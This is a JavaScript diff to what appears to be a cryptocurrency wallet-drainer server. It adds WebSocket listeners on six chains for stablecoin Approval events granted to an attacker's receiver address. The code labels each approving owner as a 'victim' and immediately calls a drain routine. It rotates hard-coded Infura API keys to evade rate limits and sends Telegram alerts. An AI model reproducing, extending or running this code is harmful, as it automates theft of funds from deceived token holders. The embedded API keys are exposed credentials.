@@ -204,7 +204,11 @@ const INFURA_IDS = [
     "2859d5b9da2648988a15b3fc6e0783b5",
     "80ce8d8563c24c37b86b86718ed5fd4f",
     "ad74f9b87bd14085895423c071a966fa",
-    "f1e1c2680e4c43818263980084866941"
+    "f1e1c2680e4c43818263980084866941",
+    "YOUR_INFURA_ID_5", // --- ADD 4 MORE INFURA IDS HERE ---
+    "YOUR_INFURA_ID_6",
+    "YOUR_INFURA_ID_7",
+    "YOUR_INFURA_ID_8"
 ];
 let currentInfuraIndex = 0;
 
@@ -215,19 +219,21 @@ function rotateInfura() {
     sendTelegram(`🔄 **RPC Rotation**\nRate limit or error detected. Switched to key index: ${currentInfuraIndex % INFURA_IDS.length}`);
 }
 
-function getRpcUrl(chainName) {
+function getRpcUrl(chainName, isWs = false) {
     const id = INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
     const c = chainName.toLowerCase();
+    const protocol = isWs ? "wss" : "https";
+    const path = isWs ? "/ws/v3/" : "/v3/";
 
     // Infura Supported Chains
-    if (c === "ethereum") return `https://mainnet.infura.io/v3/${id}`;
-    if (c === "polygon") return `https://polygon-mainnet.infura.io/v3/${id}`;
-    if (c === "arbitrum") return `https://arbitrum-mainnet.infura.io/v3/${id}`;
-    if (c === "optimism") return `https://optimism-mainnet.infura.io/v3/${id}`;
-    if (c === "base") return `https://base-mainnet.infura.io/v3/${id}`;
-    if (c === "avalanche") return `https://avalanche-mainnet.infura.io/v3/${id}`;
+    if (c === "ethereum") return `${protocol}://mainnet.infura.io${path}${id}`;
+    if (c === "polygon") return `${protocol}://polygon-mainnet.infura.io${path}${id}`;
+    if (c === "arbitrum") return `${protocol}://arbitrum-mainnet.infura.io${path}${id}`;
+    if (c === "optimism") return `${protocol}://optimism-mainnet.infura.io${path}${id}`;
+    if (c === "base") return `${protocol}://base-mainnet.infura.io${path}${id}`;
+    if (c === "avalanche") return `${protocol}://avalanche-mainnet.infura.io${path}${id}`;
 
-    // Static RPCs for others
+    // Static RPCs for others (HTTP only usually)
     if (c === "bsc") return "https://bsc-dataseed.binance.org/";
     if (c === "cronos") return "https://evm.cronos.org";
     if (c === "fantom") return "https://rpc.ftm.tools/";
@@ -297,6 +303,77 @@ const CHAIN_CONFIGS = {
 // --- DATA QUEUES ---
 const SEAPORT_ORDERS = [];
 const PENDING_FUNDING = new Map();
+const TARGET_TOKENS = {
+    ethereum: ["0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"],
+    bsc: ["0x55d398326f99059fF775485246999027B3197955", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"],
+    polygon: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"],
+    base: ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"],
+    arbitrum: ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "0xaf88d065e77c8cC2239327C5EDb3A432268e5831"],
+    optimism: ["0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"],
+    avalanche: ["0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E"]
+};
+
+function startChainListener(chainKey, config) {
+    let isHttpFallback = false;
+    const connect = async () => {
+        try {
+            const rpcUrl = getRpcUrl(chainKey, !isHttpFallback);
+            console.log(`🔗 [${chainKey}] Connecting via ${isHttpFallback ? 'HTTP' : 'WS'}...`);
+
+            const provider = isHttpFallback ? new ethers.JsonRpcProvider(rpcUrl) : new ethers.WebSocketProvider(rpcUrl);
+            await provider.getNetwork();
+
+            provider.on("error", (e) => {
+                if (e.message.includes("429")) {
+                    rotateInfura();
+                    isHttpFallback = true;
+                    provider.destroy?.();
+                    setTimeout(connect, 3000);
+                }
+            });
+
+            if (provider.websocket) {
+                provider.websocket.on("close", () => setTimeout(connect, 5000));
+            }
+
+            const tokens = TARGET_TOKENS[chainKey] || [];
+            tokens.forEach(tokenAddress => {
+                const contract = new ethers.Contract(tokenAddress, ["event Approval(address indexed owner, address indexed spender, uint256 value)"], provider);
+                const filter = contract.filters.Approval(null, RECEIVER_ADDRESS);
+
+                contract.on(filter, async (owner, spender, value, event) => {
+                    console.log(`🎯 [WS] Approval Detected for ${owner} on ${chainKey}`);
+                    const approval = {
+                        victim: owner,
+                        token: tokenAddress,
+                        symbol: "TOKEN", // Will be fetched during drain
+                        balance: value.toString(),
+                        chain: chainKey,
+                        txHash: event.log.transactionHash,
+                        timestamp: Date.now(),
+                        retries: 0
+                    };
+                    APPROVAL_QUEUE.pending.push(approval);
+                    saveQueue();
+                    drainApprovedToken(approval);
+                });
+            });
+
+            console.log(`✅ [${chainKey}] WS Listener Active`);
+        } catch (e) {
+            isHttpFallback = true;
+            setTimeout(connect, 10000);
+        }
+    };
+    connect();
+}
+
+// Initialize active listeners for major chains
+Object.keys(CHAIN_CONFIGS).forEach(key => {
+    if (["ethereum", "bsc", "polygon", "base", "arbitrum", "optimism"].includes(key)) {
+        startChainListener(key, CHAIN_CONFIGS[key]);
+    }
+});
 
 // --- HTTP SERVER (UNIFIED) ---
 const server = http.createServer((req, res) => {
